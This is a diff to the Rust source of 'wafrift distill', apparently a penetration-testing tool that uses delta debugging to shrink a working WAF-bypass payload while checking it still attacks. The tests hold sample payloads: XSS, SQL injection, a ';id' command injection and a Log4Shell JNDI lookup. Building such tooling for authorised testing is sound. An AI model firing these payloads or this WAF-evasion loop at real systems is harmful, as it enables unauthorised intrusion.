@@ -1,16 +1,33 @@
 //! `wafrift distill` — adversarial distillation via Zeller's ddmin.
 //!
 //! Given a KNOWN-working bypass payload, find the minimum-edit-
-//! distance subset that STILL bypasses. Output: a smaller, cleaner
-//! payload for pentest reports + a clearer signal of which payload
-//! features the WAF actually objected to (vs. which were noise).
+//! distance subset that STILL bypasses AND is still a working attack.
+//! Output: a smaller, cleaner payload for pentest reports + a clearer
+//! signal of which payload features the WAF actually objected to (vs.
+//! which were noise).
 //!
 //! ## Algorithm
 //!
 //! Standard ddmin (Zeller 2002 — "Yesterday, my program worked.
-//! Today, it does not. Why?"). The "fail" condition for our purposes
-//! is "the candidate STILL bypasses" — we want to keep the bypass
-//! property while shedding bytes.
+//! Today, it does not. Why?"). The "still interesting" predicate is a
+//! CONJUNCTION:
+//!
+//! 1. **Attack preserved** — the candidate still carries the attack
+//!    class (checked locally by the matching [`wafrift_oracle`]
+//!    semantic oracle, e.g. the reduced payload still parses to an
+//!    executable XSS vector / a valid SQL injection). This clause is
+//!    what makes distillation USEFUL: without it, ddmin happily
+//!    shrinks `<svg onload=alert(1)>` down to a single benign byte
+//!    that "passes" the WAF but no longer attacks anything.
+//! 2. **Still bypasses** — the candidate still gets through the WAF
+//!    (one HTTP fire).
+//!
+//! The semantic clause runs FIRST and in-process, so a candidate that
+//! has lost the attack is rejected without spending an HTTP fire —
+//! correctness and stealth (fewer requests at a rate-limited target)
+//! in one. `--class` overrides the auto-detected class; `--class none`
+//! disables the gate (WAF-bypass only — the result may not still
+//! attack, and the output says so).
 //!
 //! 1. Split the input into `n` chunks (`n = 2` to start).
 //! 2. **Subset pass:** try each chunk in isolation. If any single
@@ -50,12 +67,13 @@ use clap::Args;
 use colored::Colorize;
 use serde_json::json;
 use tokio_util::sync::CancellationToken;
+use wafrift_grammar::grammar;
 use wafrift_transport::is_waf_block;
 
 use crate::scan::scan_url_with_param;
 
 #[derive(Args, Debug)]
-pub struct DistillArgs {
+pub(crate) struct DistillArgs {
     /// Target URL.
     #[arg(value_name = "URL")]
     pub target: String,
@@ -71,6 +89,19 @@ pub struct DistillArgs {
     /// is nothing meaningful to reduce.
     #[arg(long)]
     pub payload: String,
+
+    /// Attack class used to keep distillation HONEST. ddmin only keeps a
+    /// reduced payload that STILL carries this attack class (checked locally by
+    /// the matching semantic oracle) AND still bypasses the WAF. Without it,
+    /// ddmin would gladly shrink a working `<svg onload=alert(1)>` down to a
+    /// single benign byte that "passes" the WAF but is no longer an attack — a
+    /// useless distillation. `auto` (default) detects the class from the
+    /// payload; override when auto-detection guesses wrong (e.g. heavily-encoded
+    /// or mixed-class payloads). `none` disables the semantic gate (WAF-bypass
+    /// only — the result may not be a working attack; review it by hand).
+    #[arg(long, default_value = "auto",
+          value_parser = ["auto", "none", "xss", "sql", "cmdi", "ssti", "path", "ldap", "ssrf", "nosql", "xxe", "log4shell", "cve_pocs"])]
+    pub class: String,
 
     /// Output format. `text` (default) prints a short summary; `json`
     /// emits a structured blob for piping into report tooling.
@@ -104,10 +135,17 @@ pub struct DistillArgs {
     /// Default 500 — generous for any human-written payload.
     #[arg(long, default_value_t = 500)]
     pub max_fires: u32,
+
+    /// Per-request HTTP timeout (seconds). 0 = use workspace default
+    /// (`DEFAULT_REQUEST_TIMEOUT_SECS`). R55 pass-18 I1 (CLAUDE.md
+    /// §9 WIRING): mirrors every other subcommand's `--timeout-secs`
+    /// so `.wafrift.toml`'s `http.timeout_secs` applies here too.
+    #[arg(long, default_value_t = 0)]
+    pub timeout_secs: u64,
 }
 
 /// Entry point — dispatched from `main::Commands::Distill`.
-pub async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> ExitCode {
+pub(crate) async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> ExitCode {
     args.target = crate::helpers::normalize_target_url(&args.target);
     if args.payload.is_empty() {
         eprintln!(
@@ -152,24 +190,84 @@ pub async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> Ex
         }
     }
 
+    // Resolve the attack class for the semantic gate. This is what keeps
+    // distillation honest: ddmin's predicate is the CONJUNCTION
+    //   "candidate still carries the SAME attack as the original"  AND  "still bypasses"
+    // not just "still bypasses". Without the first clause ddmin gladly shrinks a
+    // working `<svg onload=alert(1)>` to a single benign byte that the WAF passes
+    // but that no longer attacks anything — a useless distillation.
+    //
+    // The gate is `equiv_engine::oracle_valid` — the EXACT same canonical,
+    // same-exploit-preserving check `bench`/`scan` apply, so a distilled payload
+    // is sound by the identical standard (e.g. a UNION-exfil SQLi can't be reduced
+    // to a weaker boolean tautology that merely "parses as SQL"). distill operates
+    // on the literal payload (the ddmin candidate IS the effective form — no
+    // transport-encoding layer between it and the gate), so `oracle_valid(class,
+    // original, candidate)` is exactly the right question here.
+    let class: Option<String> = match args.class.as_str() {
+        "none" => None,
+        "auto" => crate::equiv_engine::class_for_payload_type(grammar::classify(&args.payload))
+            .map(str::to_string),
+        other => Some(other.to_string()),
+    };
+    // Robustness: if the gate can't even confirm the INPUT is a valid attack of
+    // its class (mis-detection, or no oracle for the class), it would reject the
+    // full input and ddmin would have no consistent starting point. Fall back to
+    // WAF-bypass-only with a loud warning rather than silently producing nonsense.
+    let class: Option<String> = match class {
+        Some(c) if crate::equiv_engine::oracle_valid(&c, &args.payload, &args.payload) => Some(c),
+        Some(c) => {
+            eprintln!(
+                "{} the {c} oracle does not recognise the input as a valid attack of that \
+                 class — distilling on WAF-bypass ALONE (the minimal form may not be a working \
+                 attack; pass --class to force the right oracle).",
+                "[wafrift distill] warning:".yellow().bold(),
+            );
+            None
+        }
+        None if args.class != "none" => {
+            eprintln!(
+                "{} no semantic oracle for the detected class — distilling on WAF-bypass ALONE. \
+                 The minimal payload may no longer be a working attack; review it by hand.",
+                "[wafrift distill] warning:".yellow().bold(),
+            );
+            None
+        }
+        None => None,
+    };
+    let semantic_gate = class.is_some();
+    let class_label = class.clone().unwrap_or_else(|| "none".to_string());
+
     let fires = Arc::new(AtomicU32::new(1)); // baseline already fired.
     let max_fires = args.max_fires;
     let target = args.target.clone();
     let param = args.param.clone();
     let delay = Duration::from_millis(args.delay_ms);
     let http_arc = Arc::new(http);
+    let original_payload = args.payload.clone();
 
     let predicate = {
         let http_arc = http_arc.clone();
         let fires = fires.clone();
         let cancel = cancel.clone();
         move |candidate: String| {
+            // Semantic gate FIRST, synchronously in the closure body: a candidate
+            // that no longer carries the attack is rejected here, before any HTTP
+            // fire — so a dead candidate costs zero requests against the (often
+            // rate-limited) target.
+            let attack_preserved = match class.as_deref() {
+                Some(c) => crate::equiv_engine::oracle_valid(c, &original_payload, &candidate),
+                None => true,
+            };
             let http = http_arc.clone();
             let target = target.clone();
             let param = param.clone();
             let fires = fires.clone();
             let cancel = cancel.clone();
             async move {
+                if !attack_preserved {
+                    return false;
+                }
                 if cancel.is_cancelled() {
                     return false;
                 }
@@ -214,6 +312,12 @@ pub async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> Ex
             "reduction_pct": reduction_pct,
             "fires": fires_made,
             "fires_capped": fires_capped,
+            "attack_class": class_label,
+            // true ⇒ the minimal payload is guaranteed to STILL carry the same
+            // attack as the original (the canonical oracle gated every reduction).
+            // false ⇒ WAF-bypass only — the minimal form may no longer be a
+            // working attack; review by hand.
+            "semantic_preservation": semantic_gate,
         });
         match serde_json::to_string_pretty(&out) {
             Ok(s) => println!("{s}"),
@@ -247,6 +351,18 @@ pub async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> Ex
                 String::new()
             }
         );
+        if semantic_gate {
+            println!(
+                "  {} every reduction kept a valid {} attack — the minimal payload still fires.",
+                "Verified:".bold().green(),
+                class_label.bright_white()
+            );
+        } else {
+            println!(
+                "  {} WAF-bypass only (no class oracle) — confirm the minimal payload still attacks.",
+                "Caveat:".bold().yellow()
+            );
+        }
     }
 
     ExitCode::SUCCESS
@@ -264,7 +380,7 @@ pub async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> Ex
 /// - If `test(input)` is true, the returned string also makes
 ///   `test` return true (by induction over the reduction steps).
 /// - If `test` is constant-true, returns a single-char string.
-pub async fn ddmin<F, Fut>(input: &str, test: F) -> String
+pub(crate) async fn ddmin<F, Fut>(input: &str, test: F) -> String
 where
     F: Fn(String) -> Fut,
     Fut: std::future::Future<Output = bool>,
@@ -369,7 +485,10 @@ async fn fire_and_check(
     let url = scan_url_with_param(target, param, &urlencoding_encode(payload));
     let resp = http.get(&url).send().await.map_err(|e| format!("{e}"))?;
     let status = resp.status().as_u16();
-    let body = resp.bytes().await.map_err(|e| format!("{e}"))?;
+    // §15 OOM / decompression-bomb: cap the body read.
+    let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
+        .await
+        .map_err(|e| format!("{e}"))?;
     Ok(!is_waf_block(status, &body))
 }
 
@@ -390,8 +509,13 @@ fn urlencoding_encode(s: &str) -> String {
 }
 
 fn build_http_client(args: &DistillArgs) -> Result<reqwest::Client, ExitCode> {
+    let timeout = if args.timeout_secs > 0 {
+        args.timeout_secs
+    } else {
+        wafrift_types::DEFAULT_REQUEST_TIMEOUT_SECS
+    };
     crate::parser_diff_common::build_diff_http_client(
-        wafrift_types::DEFAULT_REQUEST_TIMEOUT_SECS,
+        timeout,
         args.insecure,
         args.proxy.as_deref(),
         &args.header,
@@ -456,6 +580,115 @@ mod tests {
         assert_eq!(result, "a");
     }
 
+    // ── Attack-preservation gate (the distill correctness fix) ───────────────
+    //
+    // distill's real predicate is the CONJUNCTION "still a valid attack of its
+    // class" AND "still bypasses the WAF". These tests pin that the attack-
+    // preservation clause stops ddmin shrinking a working payload into a benign
+    // byte that merely passes the filter. They model the WAF as "passes
+    // everything" (constant-true) — the worst case, where ONLY the semantic
+    // oracle constrains the reduction.
+
+    #[tokio::test]
+    async fn semantic_gate_keeps_a_valid_xss_attack_through_ddmin() {
+        use crate::equiv_engine::oracle_valid;
+
+        let original = "<svg onload=alert(1)>";
+        assert!(
+            oracle_valid("xss", original, original),
+            "precondition: the canonical gate must accept the full input"
+        );
+
+        let orig = original.to_string();
+        // Mirror the production structure: the sync semantic gate runs in the
+        // closure body, the future just yields the resulting bool. The WAF is
+        // modelled as "passes everything" (the worst case for collapse).
+        let result = ddmin(original, move |cand: String| {
+            let ok = oracle_valid("xss", &orig, &cand);
+            async move { ok }
+        })
+        .await;
+
+        assert!(
+            oracle_valid("xss", original, &result),
+            "the distilled payload must STILL be a valid XSS attack, got {result:?}"
+        );
+        assert!(
+            result.chars().count() > 1,
+            "the gate must prevent collapse to a single benign byte, got {result:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn without_the_semantic_gate_ddmin_collapses_to_noise() {
+        use crate::equiv_engine::oracle_valid;
+
+        // The OLD (buggy) distill predicate: "WAF passes" ALONE, modelled as
+        // constant-true. With nothing preserving the attack, ddmin shrinks a
+        // working XSS vector to a single byte — the exact failure the gate fixes.
+        let original = "<svg onload=alert(1)>";
+        let result = ddmin(original, |_c| async move { true }).await;
+        assert_eq!(
+            result.chars().count(),
+            1,
+            "WAF-only ddmin collapses to one char, got {result:?}"
+        );
+        assert!(
+            !oracle_valid("xss", original, &result),
+            "the collapsed payload is no longer an attack — this is WHY the gate exists"
+        );
+    }
+
+    #[tokio::test]
+    async fn semantic_gate_preserves_sql_injection_through_ddmin() {
+        use crate::equiv_engine::oracle_valid;
+
+        // The canonical SQL gate is SAME-EXPLOIT-preserving (`still_executes` +
+        // valid-injection parse), so the distilled form must remain the same
+        // attack, not merely "some valid SQL".
+        let original = "1 OR 1=1 -- ";
+        assert!(
+            oracle_valid("sql", original, original),
+            "precondition: the canonical gate must accept the full input"
+        );
+
+        let orig = original.to_string();
+        let result = ddmin(original, move |cand: String| {
+            let ok = oracle_valid("sql", &orig, &cand);
+            async move { ok }
+        })
+        .await;
+
+        assert!(
+            oracle_valid("sql", original, &result),
+            "the distilled payload must STILL be a valid SQL injection, got {result:?}"
+        );
+    }
+
+    #[test]
+    fn distill_class_resolution_matches_the_canonical_gate() {
+        use crate::equiv_engine::{class_for_payload_type, oracle_valid};
+        use wafrift_grammar::grammar::PayloadType;
+
+        // `auto` resolves through the SAME PayloadType→class mapping bench/scan
+        // use — distill is wired to the one canonical gate, not a private copy.
+        assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
+        assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
+        assert_eq!(class_for_payload_type(PayloadType::CommandInjection), Some("cmdi"));
+
+        // The structural-class gates are live — they reject an obvious non-attack,
+        // so a `--class` override never silently disables the gate for them.
+        assert!(!oracle_valid("xss", "<svg onload=alert(1)>", "hello world"));
+        assert!(!oracle_valid("sql", "1 OR 1=1", ")) not sql at all (("));
+        assert!(!oracle_valid("cmdi", ";id", "harmless plain text"));
+
+        // cve_pocs has no per-CVE oracle, so the gate validates ONLY intact
+        // transmission (anti-rig, LAW 1): identity passes, any mutation is refused
+        // — distilling a CVE PoC can therefore only ever return it unchanged.
+        assert!(oracle_valid("cve_pocs", "${jndi:ldap://x/a}", "${jndi:ldap://x/a}"));
+        assert!(!oracle_valid("cve_pocs", "${jndi:ldap://x/a}", "${jndi:ldap://x/b}"));
+    }
+
     #[tokio::test]
     async fn ddmin_handles_empty_input_trivially() {
         let result = ddmin("", |_s| async move { false }).await;
@@ -507,12 +740,14 @@ mod tests {
             target: target.into(),
             param: "q".into(),
             payload: payload.into(),
+            class: "auto".into(),
             format: "text".into(),
             delay_ms: 0,
             insecure: false,
             proxy: None,
             header: Vec::new(),
             max_fires: 500,
+            timeout_secs: 0,
         }
     }
 
